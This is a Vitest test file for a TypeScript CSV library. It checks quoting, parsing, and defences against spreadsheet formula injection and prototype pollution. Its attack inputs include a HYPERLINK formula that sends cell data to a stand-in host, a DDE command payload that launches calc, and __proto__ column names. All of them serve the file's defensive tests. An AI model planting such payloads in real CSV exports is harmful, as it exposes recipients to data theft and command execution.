import { describe, expect, it } from 'vitest';
import { toCsv, recordsToCsv, parseCsv, parseCsvRecords, needsFormulaGuard, unguardFormula } from '../csv';

describe('toCsv', () => {
  it('joins rows with CRLF and leaves simple fields unquoted', () => {
    expect(toCsv([['a', 'b'], ['1', '2']])).toBe('a,b\r\n1,2');
  });

  it('quotes fields with comma, quote, or newline', () => {
    expect(toCsv([['a,b', 'c"d', 'e\nf']])).toBe('"a,b","c""d","e\nf"');
  });
});

describe('recordsToCsv', () => {
  it('emits a header + rows in column order, blanking missing values', () => {
    const rows = [{ x: 1, y: 'a' }, { x: 2, y: undefined as unknown as string }];
    expect(recordsToCsv(rows, ['x', 'y'])).toBe('x,y\r\n1,a\r\n2,');
  });

  it('blanks an explicit null value (distinct from the string "null")', () => {
    // `v === null` を false 固定する mutant は null を String(null)="null" にするため、
    // 空欄を確認して kill。
    const rows = [{ x: 1, y: null as unknown as string }];
    expect(recordsToCsv(rows, ['x', 'y'])).toBe('x,y\r\n1,');
  });
});

describe('parseCsv', () => {
  it('parses simple rows', () => {
    expect(parseCsv('a,b\r\n1,2')).toEqual([['a', 'b'], ['1', '2']]);
  });

  it('handles quoted commas, doubled quotes and embedded newlines', () => {
    expect(parseCsv('"a,b","c""d","e\nf"')).toEqual([['a,b', 'c"d', 'e\nf']]);
  });

  it('tolerates a trailing newline (no phantom empty row)', () => {
    expect(parseCsv('a,b\r\n1,2\r\n')).toEqual([['a', 'b'], ['1', '2']]);
    expect(parseCsv('a\n')).toEqual([['a']]);
  });

  it('accepts plain \\n line endings', () => {
    expect(parseCsv('a,b\n1,2')).toEqual([['a', 'b'], ['1', '2']]);
  });

  it('treats a lone \\r (not followed by \\n) as a row terminator', () => {
    // \r ブロックを空にする / 条件を false 固定する mutant は 'a','b' を 'ab' に
    // 連結してしまうため、行分割を確認して kill。
    expect(parseCsv('a\rb')).toEqual([['a'], ['b']]);
  });

  it('parses a lone opening quote as a single empty field', () => {
    // started フラグを false 固定する mutant は最終フラッシュを抑止し [] を返すため、
    // started のみが真になるこの入力で kill。
    expect(parseCsv('"')).toEqual([['']]);
  });

  it('returns [] for empty input', () => {
    expect(parseCsv('')).toEqual([]);
  });

  it('round-trips through toCsv', () => {
    const rows = [['col,1', 'q"x'], ['line\nbreak', 'plain']];
    expect(parseCsv(toCsv(rows))).toEqual(rows);
  });
});

describe('parseCsvRecords', () => {
  it('keys rows by header', () => {
    expect(parseCsvRecords('date,amount\r\n2026-05-01,100\r\n2026-05-02,200')).toEqual([
      { date: '2026-05-01', amount: '100' },
      { date: '2026-05-02', amount: '200' },
    ]);
  });

  it('maps positionally when a row is short or long', () => {
    expect(parseCsvRecords('a,b,c\r\n1\r\n1,2,3,4')).toEqual([
      { a: '1', b: '', c: '' },
      { a: '1', b: '2', c: '3' },
    ]);
  });

  it('returns [] when there is only a header', () => {
    expect(parseCsvRecords('a,b')).toEqual([]);
    expect(parseCsvRecords('')).toEqual([]);
  });
});

describe('CSV 数式インジェクション (CWE-1236)', () => {
  it('= + @ タブ CR で始まる値を数式のまま書き出さない', () => {
    // 表計算ソフトはこれらを数式として実行する。取り込んだ外部データが
    // そのまま出ていくと、CSV を開いた人の環境で走る。
    const attacks = [
      '=HYPERLINK("http://evil.test/?x="&A1,"click")',
      '=1+1',
      '+1+1',
      '@SUM(A1)',
      '\tcmd',
      '\rcmd',
      '=cmd|\'/c calc\'!A1',
    ];
    for (const a of attacks) {
      const out = toCsv([[a]]);
      expect(out.startsWith('='), a).toBe(false);
      expect(out.startsWith('+'), a).toBe(false);
      expect(out.startsWith('@'), a).toBe(false);
      // 打ち消しは先頭の ' で行う（引用符で囲むだけでは数式のまま）。
      expect(out.replace(/^"/, '').startsWith("'"), a).toBe(true);
    }
  });

  it('引用符で囲むだけにしない（"=1+1" も数式として解釈される）', () => {
    expect(toCsv([['=1+1']])).toBe("'=1+1");
  });

  it('負の数はテキストにしない（会計データが集計できなくなる）', () => {
    for (const n of ['-1000', '-1.5', '+42', '-0.5e3', '-.5']) {
      expect(needsFormulaGuard(n), n).toBe(false);
      expect(toCsv([[n]]), n).toBe(n);
    }
  });

  it('小数・指数つきの負数も数値として通す', () => {
    for (const n of ['-1.55', '-.55', '-1.', '-1e10', '-1e100', '-1e+10', '-1E-3', '+2.5e2']) {
      expect(needsFormulaGuard(n), n).toBe(false);
    }
  });

  it('数値の形を少しでも外れたら打ち消す', () => {
    for (const v of ['-1.5.5', '-1e', '-1e+', '-e10', '-1e1a', '- 1']) {
      expect(needsFormulaGuard(v), v).toBe(true);
    }
  });

  it('よそのCSVにある生の数式セルは、読んでも 1 文字落とさない', () => {
    // 打ち消しが付いていない値に unguard をかけて先頭を削ると、
    // '=1+1' が '1+1' に化けて中身が変わる。
    expect(unguardFormula('=1+1')).toBe('=1+1');
    expect(unguardFormula('@SUM(A1)')).toBe('@SUM(A1)');
    expect(parseCsv('=1+1')).toEqual([['=1+1']]);
  });

  it('先頭が引用符でない値から勝手に 1 文字落とさない', () => {
    // startsWith("'") の判定が緩むと 'x=1' の x を剥がして '=1' にしてしまう。
    expect(unguardFormula('x=1')).toBe('x=1');
    expect(unguardFormula('a-1')).toBe('a-1');
  });

  it('数値に見えるが数値でないものは打ち消す', () => {
    for (const v of ['-1000+SUM(A1)', '+1-2-cmd', '-1a']) {
      expect(needsFormulaGuard(v), v).toBe(true);
    }
  });

  it('数式でない値は一切触らない', () => {
    for (const v of ['abc', '1000', '株式会社サンプル', '', 'a=b', "'hello"]) {
      expect(needsFormulaGuard(v), v).toBe(false);
      expect(toCsv([[v]]), v).toBe(v === '' ? '' : v);
    }
  });

  it('書き出して読み直しても値が変わらない（往復不変）', () => {
    const values = [
      '=1+1', '+1', '@x', '-1000', 'abc', "'hello", "'=1+1", "''=1+1",
      'a,b', 'a"b', 'a\nb', '株式会社サンプル', '=HYPERLINK("x")', '\tx',
    ];
    // 空文字だけは対象外。`toCsv([['']])` は '' で、`parseCsv('')` は仕様どおり
    // [] を返すため（この打ち消し対応より前からの挙動）。下の it で固定する。
    for (const v of values) {
      const round = parseCsv(toCsv([[v]]));
      expect(round[0]?.[0], `往復で変化: ${JSON.stringify(v)}`).toBe(v);
    }
  });

  it('空文字 1 個だけの往復は元から [] になる（この対応で変えていない）', () => {
    expect(toCsv([['']])).toBe('');
    expect(parseCsv('')).toEqual([]);
    // 行に他の列があれば空文字も往復する。
    expect(parseCsv(toCsv([['', 'x']]))).toEqual([['', 'x']]);
  });

  it('複数列・複数行でも往復する', () => {
    const rows = [['name', 'amount'], ['=cmd', '-500'], ["'=x", '1,000']];
    expect(parseCsv(toCsv(rows))).toEqual(rows);
  });

  it('unguardFormula は打ち消しだけを外す', () => {
    expect(unguardFormula("'=1")).toBe('=1');
    expect(unguardFormula("''=1")).toBe("'=1");
    expect(unguardFormula("'hello")).toBe("'hello");
    expect(unguardFormula('hello')).toBe('hello');
    expect(unguardFormula("'")).toBe("'");
    expect(unguardFormula('')).toBe('');
  });

  it('recordsToCsv 経由でも打ち消される', () => {
    const out = recordsToCsv([{ name: '=cmd|\'/c calc\'!A1', amt: '-100' }], ['name', 'amt']);
    expect(out).toContain("'=cmd");
    expect(out).toContain('-100');
  });

  it('ヘッダ名が数式でも打ち消される', () => {
    expect(toCsv([['=evil'], ['x']])).toBe("'=evil\r\nx");
  });
});

describe('parseCsvRecords — 特殊な列名', () => {
  it('__proto__ という列名でも値が消えない', () => {
    const recs = parseCsvRecords('name,__proto__\nalice,evil\n');
    expect(recs).toHaveLength(1);
    expect(recs[0]!['__proto__']).toBe('evil');
    expect(typeof recs[0]!['__proto__']).toBe('string');
  });

  it('constructor / toString という列名も普通に読める', () => {
    const recs = parseCsvRecords('constructor,toString\na,b\n');
    expect(recs[0]!['constructor']).toBe('a');
    expect(recs[0]!['toString']).toBe('b');
  });

  it('グローバルのプロトタイプを汚さない', () => {
    parseCsvRecords('__proto__\n{"polluted":1}\n');
    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined();
  });
});
